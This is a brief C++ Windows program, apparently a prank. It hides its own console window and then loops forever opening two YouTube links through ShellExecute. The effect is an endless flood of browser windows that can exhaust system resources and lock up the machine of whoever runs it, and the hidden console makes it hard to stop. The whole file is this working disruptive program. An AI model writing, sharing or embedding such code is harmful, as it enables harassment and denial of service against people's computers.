#include "Windows.h"
using namespace std;

int main()
{
	bool truth = true;
	FreeConsole();
	while (truth == true) {
		ShellExecute(0, 0, "https://www.youtube.com/watch?v=vS43ZgcQ_hE", 0, 0, SW_SHOW);
		ShellExecute(0, 0, "https://www.youtube.com/watch?v=BiGTx8d2zdU", 0, 0, SW_SHOW);
	}
    return 0;
}

